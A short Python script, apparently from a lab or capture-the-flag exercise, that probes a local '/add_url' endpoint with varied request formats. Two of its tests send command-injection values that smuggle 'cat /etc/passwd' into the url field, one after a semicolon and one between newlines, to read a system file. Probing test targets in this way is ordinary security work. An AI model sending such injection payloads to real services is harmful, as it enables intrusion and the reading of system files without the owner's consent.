import requests

# Target endpoint
url = "http://127.0.0.1:32998/add_url"

print("Testing different request formats...")

# First, let's test a normal valid request
print("\n[1] Testing normal request:")
resp = requests.post(url, data={"url": "http://example.com"})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Test with empty url
print("\n[2] Testing empty URL:")
resp = requests.post(url, data={"url": ""})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Test without url parameter
print("\n[3] Testing without URL param:")
resp = requests.post(url, data={})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Try with JSON
print("\n[4] Testing JSON:")
resp = requests.post(url, json={"url": "http://example.com"})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Try different injection with spaces encoding
print("\n[5] Testing URL encoding:")
resp = requests.post(url, data={"url": ";cat%20/etc/passwd"})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Try newline
print("\n[6] Testing newline:")
resp = requests.post(url, data={"url": "\ncat /etc/passwd\n"})
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Check app with GET
print("\n[7] Testing GET to add_url:")
resp = requests.get(url)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text[:500]}")

